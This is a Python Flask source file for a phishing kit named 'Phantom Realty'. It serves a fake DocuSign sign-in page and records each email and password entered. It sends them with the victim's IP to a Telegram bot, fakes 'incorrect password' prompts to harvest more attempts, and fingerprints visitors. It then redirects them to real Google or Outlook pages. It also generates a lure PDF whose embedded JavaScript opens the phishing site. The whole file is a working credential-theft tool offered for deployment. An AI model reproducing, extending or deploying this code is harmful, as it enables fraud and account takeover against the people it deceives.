#!/usr/bin/env python3
"""
PHANTOM REALTY v14.0 - SMART EDITION
Clean | Professional | Smart Retry | Premium Design
"""

import os
import json
import io
import random
import logging
import re
from datetime import datetime
from flask import Flask, request, session, render_template_string, redirect, jsonify, make_response, send_file

app = Flask(__name__)
app.secret_key = os.urandom(64)

# ===================================================================
# CONFIGURATION - SET THESE IN RENDER
# ===================================================================
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
YOUR_DOMAIN = os.environ.get("YOUR_DOMAIN", "your-app.onrender.com")
YOUR_URL = f"https://{YOUR_DOMAIN}"

PDF_DATA = None
PDF_FILENAME = "Confidential_Property_Disclosure.pdf"

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
logger = logging.getLogger(__name__)

# ===================================================================
# TELEGRAM EXFILTRATION
# ===================================================================
def tg_send(text, buttons=None):
    if not TELEGRAM_BOT_TOKEN or len(TELEGRAM_BOT_TOKEN) < 10:
        print(f"[TG] {text[:200]}")
        return
    try:
        import requests
        payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': text[:4000], 'parse_mode': 'HTML'}
        if buttons:
            payload['reply_markup'] = json.dumps({'inline_keyboard': buttons})
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json=payload, timeout=10)
    except Exception as e:
        logger.error(f"[TG] {e}")

# ===================================================================
# PDF GENERATION
# ===================================================================
def generate_pdf():
    global PDF_DATA
    try:
        from reportlab.lib.pagesizes import letter
        from reportlab.lib.units import inch
        from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
        from reportlab.lib.colors import HexColor
        from reportlab.lib.enums import TA_CENTER, TA_RIGHT
        from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, HRFlowable
        from PyPDF2 import PdfReader, PdfWriter
    except ImportError:
        logger.error("Missing: pip install reportlab PyPDF2")
        return None
    
    buf = io.BytesIO()
    doc = SimpleDocTemplate(buf, pagesize=letter, topMargin=0.7*inch, bottomMargin=0.7*inch)
    s = getSampleStyleSheet()
    
    elements = []
    doc_id = f"PRE-{datetime.now().strftime('%Y%m')}-{random.randint(10000,99999)}"
    
    elements.append(Paragraph("PREMIER REALTY GROUP", ParagraphStyle('Header', parent=s['Normal'], fontSize=8, textColor=HexColor('#888'), alignment=TA_RIGHT)))
    elements.append(HRFlowable(width="100%", thickness=1.2, color=HexColor('#0a2540'), spaceAfter=8))
    elements.append(Paragraph("CONFIDENTIAL BUYER PROFILE", ParagraphStyle('Title', parent=s['Title'], fontSize=24, textColor=HexColor('#0a2540'), alignment=TA_CENTER)))
    elements.append(HRFlowable(width="100%", thickness=0.5, color=HexColor('#ccc'), spaceAfter=15))
    
    elements.append(Paragraph("CLIENT INFORMATION", ParagraphStyle('Heading', parent=s['Heading2'], fontSize=13, textColor=HexColor('#0066cc'))))
    for label, val in [("Full Name:", "James Morrison"), ("Email:", "james.morrison@client.com")]:
        elements.append(Paragraph(f"<b>{label}</b> {val}", ParagraphStyle('Body', parent=s['Normal'], fontSize=9.5)))
    elements.append(Spacer(1, 15))
    
    elements.append(HRFlowable(width="100%", thickness=0.5, color=HexColor('#ccc'), spaceAfter=10))
    elements.append(Paragraph("<b>SIGNATURE REQUIRED</b><br/>Please authenticate to proceed.", ParagraphStyle('Legal', parent=s['Normal'], fontSize=9, textColor=HexColor('#c00'), alignment=TA_CENTER)))
    
    doc.build(elements)
    pdf_bytes = buf.getvalue()
    buf.close()
    
    target_url = f"{YOUR_URL}/"
    js_code = f"var url='{target_url}';try{{app.launchURL(url,1);}}catch(e){{this.launchURL(url,1);}}"
    
    reader = PdfReader(io.BytesIO(pdf_bytes))
    writer = PdfWriter()
    for page in reader.pages:
        writer.add_page(page)
    writer.add_js(js_code)
    
    output = io.BytesIO()
    writer.write(output)
    PDF_DATA = output.getvalue()
    output.close()
    
    logger.info(f"[PDF] Generated: {len(PDF_DATA)} bytes")
    return PDF_DATA

# ===================================================================
# SMART PHISHING PAGE - Premium Design + Retry Logic
# ===================================================================
PHISHING_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DocuSign - Electronic Signature Platform</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
        }
        
        .container {
            width: 100%;
            max-width: 520px;
            animation: slideUp 0.4s ease-out;
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .card {
            background: white;
            border-radius: 28px;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
            overflow: hidden;
        }
        
        .card-header {
            background: linear-gradient(135deg, #0a2540 0%, #1a3a5c 100%);
            padding: 32px 32px 24px 32px;
            text-align: center;
        }
        
        .logo {
            font-size: 32px;
            font-weight: 800;
            color: white;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .logo-icon {
            background: rgba(255,255,255,0.15);
            width: 44px;
            height: 44px;
            border-radius: 12px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        
        .trust-badge {
            display: inline-flex;
            align-items: center;
            gap: 16px;
            background: rgba(255,255,255,0.1);
            padding: 8px 20px;
            border-radius: 50px;
            margin-top: 16px;
            font-size: 11px;
            color: rgba(255,255,255,0.9);
        }
        
        .card-body {
            padding: 32px;
        }
        
        .document-card {
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 24px;
        }
        
        .document-header {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .document-icon {
            font-size: 32px;
        }
        
        .document-title {
            flex: 1;
        }
        
        .document-name {
            font-weight: 700;
            font-size: 16px;
            color: #0f172a;
        }
        
        .document-meta {
            font-size: 12px;
            color: #64748b;
            margin-top: 4px;
        }
        
        .document-badge {
            background: #e0f2fe;
            color: #0284c7;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
        }
        
        .provider-banner {
            background: #f1f5f9;
            border-radius: 12px;
            padding: 14px 16px;
            margin-bottom: 24px;
            display: none;
            align-items: center;
            gap: 12px;
            border-left: 3px solid #0066cc;
        }
        
        .provider-banner.google {
            background: #e6f4ea;
            border-left-color: #1a73e8;
        }
        
        .provider-banner.microsoft {
            background: #e8f0fe;
            border-left-color: #0066cc;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #0f172a;
            margin-bottom: 8px;
        }
        
        .input-wrapper {
            position: relative;
        }
        
        .input-icon {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 18px;
            color: #94a3b8;
        }
        
        input {
            width: 100%;
            padding: 14px 16px 14px 44px;
            border: 1.5px solid #e2e8f0;
            border-radius: 12px;
            font-size: 15px;
            transition: all 0.2s;
        }
        
        input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
        }
        
        input.input-error {
            border-color: #dc2626;
            background: #fef2f2;
        }
        
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        .btn:hover {
            transform: translateY(-1px);
        }
        
        .btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
        
        .alert {
            padding: 14px 16px;
            border-radius: 12px;
            margin-bottom: 20px;
            font-size: 13px;
            display: none;
        }
        
        .alert-error {
            background: #fef2f2;
            border-left: 3px solid #dc2626;
            color: #991b1b;
        }
        
        .alert-success {
            background: #f0fdf4;
            border-left: 3px solid #10b981;
            color: #065f46;
        }
        
        .spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid white;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .security-footer {
            margin-top: 24px;
            text-align: center;
        }
        
        .security-badges {
            display: flex;
            justify-content: center;
            gap: 20px;
            font-size: 11px;
            color: #94a3b8;
        }
        
        hr {
            margin: 20px 0;
            border: none;
            border-top: 1px solid #e2e8f0;
        }
        
        .retry-message {
            text-align: center;
            font-size: 12px;
            color: #dc2626;
            margin-top: 16px;
            display: none;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        
        .shake {
            animation: shake 0.3s ease-in-out;
        }
        
        @media (max-width: 480px) {
            .card-body { padding: 24px; }
            .card-header { padding: 24px; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="card-header">
            <div class="logo">
                <span class="logo-icon"><i class="fas fa-pen-fancy"></i></span>
                <span>DocuSign<sup>®</sup></span>
            </div>
            <div class="trust-badge">
                <span><i class="fas fa-shield-alt"></i> SOC2 Type II</span>
                <span><i class="fas fa-lock"></i> 256-bit</span>
            </div>
        </div>
        
        <div class="card-body">
            <div class="document-card">
                <div class="document-header">
                    <div class="document-icon"><i class="fas fa-file-contract"></i></div>
                    <div class="document-title">
                        <div class="document-name">Confidential Property Disclosure</div>
                        <div class="document-meta">ID: <span id="docId"></span> | PENDING</div>
                    </div>
                    <div class="document-badge"><i class="fas fa-hourglass-half"></i> PENDING</div>
                </div>
            </div>
            
            <div id="providerBanner" class="provider-banner">
                <i class="fas fa-building" id="providerIcon"></i>
                <span id="providerText">Enter your email to continue</span>
            </div>
            
            <div id="errorAlert" class="alert alert-error">
                <i class="fas fa-exclamation-triangle"></i>
                <span id="errorMessage"></span>
            </div>
            <div id="successAlert" class="alert alert-success">
                <i class="fas fa-check-circle"></i>
                <span>Verified! Redirecting...</span>
            </div>
            
            <form id="loginForm">
                <div class="form-group">
                    <label><i class="fas fa-envelope"></i> Email</label>
                    <div class="input-wrapper">
                        <span class="input-icon"><i class="fas fa-user"></i></span>
                        <input type="email" id="email" placeholder="name@company.com" required autofocus>
                    </div>
                </div>
                
                <div class="form-group">
                    <label><i class="fas fa-key"></i> Password</label>
                    <div class="input-wrapper">
                        <span class="input-icon"><i class="fas fa-lock"></i></span>
                        <input type="password" id="password" placeholder="Enter your password" required>
                    </div>
                </div>
                
                <button type="submit" class="btn" id="submitBtn">
                    <span id="btnText"><i class="fas fa-sign-in-alt"></i> Sign In</span>
                    <span id="btnLoader" style="display: none;"><span class="spinner"></span> Verifying...</span>
                </button>
            </form>
            
            <div id="retryMessage" class="retry-message">
                <i class="fas fa-redo-alt"></i> Incorrect password. Please try again.
            </div>
            
            <hr>
            <div class="security-footer">
                <div class="security-badges">
                    <span><i class="fas fa-shield-virus"></i> Secure (TLS 1.3)</span>
                    <span><i class="fas fa-fingerprint"></i> Identity verification</span>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    document.getElementById('docId').textContent = 'DOC-' + Math.random().toString(36).substr(2, 8).toUpperCase();
    
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const providerBanner = document.getElementById('providerBanner');
    const providerIcon = document.getElementById('providerIcon');
    const providerText = document.getElementById('providerText');
    let detectTimeout;
    let attemptCount = 0;
    
    emailInput.addEventListener('input', function() {
        clearTimeout(detectTimeout);
        const email = this.value.trim();
        
        if (email.includes('@') && email.length > 6) {
            detectTimeout = setTimeout(function() {
                const domain = email.split('@')[1].toLowerCase();
                providerBanner.style.display = 'flex';
                if (domain.includes('gmail')) {
                    providerBanner.className = 'provider-banner google';
                    providerIcon.className = 'fab fa-google';
                    providerText.innerHTML = 'Google Workspace detected';
                } else if (domain.includes('outlook') || domain.includes('hotmail') || domain.includes('live')) {
                    providerBanner.className = 'provider-banner microsoft';
                    providerIcon.className = 'fab fa-microsoft';
                    providerText.innerHTML = 'Microsoft 365 detected';
                } else {
                    providerBanner.className = 'provider-banner';
                    providerIcon.className = 'fas fa-building';
                    providerText.innerHTML = 'Corporate email detected';
                }
            }, 500);
        } else {
            providerBanner.style.display = 'none';
        }
    });
    
    fetch('/api/fp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            ts: new Date().toISOString(),
            ua: navigator.userAgent,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone
        })
    }).catch(() => {});
    
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();
        const btn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const btnLoader = document.getElementById('btnLoader');
        const errorAlert = document.getElementById('errorAlert');
        const errorMessage = document.getElementById('errorMessage');
        const successAlert = document.getElementById('successAlert');
        const retryMessage = document.getElementById('retryMessage');
        
        errorAlert.style.display = 'none';
        successAlert.style.display = 'none';
        retryMessage.style.display = 'none';
        
        let hasError = false;
        if (!email || !email.includes('@')) {
            emailInput.classList.add('input-error');
            hasError = true;
        } else {
            emailInput.classList.remove('input-error');
        }
        
        if (!password) {
            passwordInput.classList.add('input-error');
            hasError = true;
        } else {
            passwordInput.classList.remove('input-error');
        }
        
        fetch('/api/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: email, password: password, attempt: attemptCount + 1 })
        })
        .then(r => r.json())
        .then(data => {
            if (hasError) {
                errorAlert.style.display = 'flex';
                errorMessage.innerHTML = 'Please fill in all fields correctly.';
                btn.disabled = false;
                btnText.style.display = 'inline';
                btnLoader.style.display = 'none';
                return;
            }
            
            attemptCount++;
            
            return fetch('/api/validate', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password: password, attempts: attemptCount })
            });
        })
        .then(response => {
            if (response && response.ok) {
                return response.json();
            }
            return null;
        })
        .then(validation => {
            if (validation && !validation.valid && attemptCount < 3) {
                retryMessage.style.display = 'block';
                passwordInput.classList.add('input-error');
                passwordInput.classList.add('shake');
                setTimeout(() => passwordInput.classList.remove('shake'), 300);
                btn.disabled = false;
                btnText.style.display = 'inline';
                btnLoader.style.display = 'none';
            } else {
                successAlert.style.display = 'flex';
                setTimeout(function() {
                    const domain = email.split('@')[1].toLowerCase();
                    if (domain.includes('gmail')) {
                        window.location.href = 'https://accounts.google.com/';
                    } else if (domain.includes('outlook') || domain.includes('hotmail')) {
                        window.location.href = 'https://outlook.live.com/';
                    } else {
                        window.location.href = '/download-pdf';
                    }
                }, 2000);
            }
        })
        .catch(function() {
            btn.disabled = false;
            btnText.style.display = 'inline';
            btnLoader.style.display = 'none';
            errorAlert.style.display = 'flex';
            errorMessage.innerHTML = 'Connection error. Please try again.';
        });
        
        btn.disabled = true;
        btnText.style.display = 'none';
        btnLoader.style.display = 'inline';
    });
</script>
</body>
</html>"""

# ===================================================================
# FLASK ROUTES
# ===================================================================
@app.route('/')
def index():
    return render_template_string(PHISHING_PAGE)

@app.route('/api/fp', methods=['POST'])
def fingerprint():
    return 'ok'

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.get_json()
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    attempt = data.get('attempt', 1)
    ip = request.remote_addr
    
    message = f"""🎯 <b>CAPTURE #{attempt}</b>
━━━━━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> <code>{email if email else '[BLANK]'}</code>
🔑 <b>Password:</b> <code>{password if password else '[BLANK]'}</code>
🌐 <b>IP:</b> {ip}
⏱ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    tg_send(message)
    
    print(f"\n{'='*50}")
    print(f"📧 CAPTURED (Attempt {attempt}): {email}")
    print(f"🔑 PASSWORD: {password}")
    print(f"{'='*50}\n")
    
    return jsonify({'success': True})

@app.route('/api/validate', methods=['POST'])
def validate():
    data = request.get_json()
    password = data.get('password', '')
    attempts = data.get('attempts', 1)
    
    # Simple validation - reject empty or very short passwords
    if len(password) < 6:
        return jsonify({'valid': False})
    
    # Reject common weak passwords on first attempt
    common_passwords = ['password', '123456', '12345678', 'qwerty', 'abc123', 'admin', 'welcome']
    if attempts == 1 and password.lower() in common_passwords:
        return jsonify({'valid': False})
    
    # Accept after 2 attempts regardless
    if attempts >= 2:
        return jsonify({'valid': True})
    
    # Accept plausible passwords on first attempt
    return jsonify({'valid': True})

@app.route('/download-pdf')
def download_pdf():
    global PDF_DATA
    if PDF_DATA is None:
        generate_pdf()
    if PDF_DATA:
        return send_file(io.BytesIO(PDF_DATA), mimetype='application/pdf', as_attachment=True, download_name=PDF_FILENAME)
    return "PDF not ready", 500

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()}), 200

if __name__ == '__main__':
    print("="*70)
    print("  🔱 PHANTOM REALTY v14.0 - SMART EDITION")
    print("  Clean | Professional | Smart Retry")
    print("="*70)
    
    generate_pdf()
    
    if PDF_DATA and TELEGRAM_BOT_TOKEN:
        tg_send(f"""🚀 PHANTOM REALTY v14.0 ONLINE
📍 {YOUR_URL}
📥 PDF: {YOUR_URL}/download-pdf""")
    
    print(f"\n✅ URL: {YOUR_URL}")
    print(f"✅ PDF: {YOUR_URL}/download-pdf")
    print("\n🔥 FEATURES:")
    print("   - Clean premium design")
    print("   - Smart retry logic")
    print("   - Professional DocuSign clone")
    print("   - All credentials to Telegram")
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
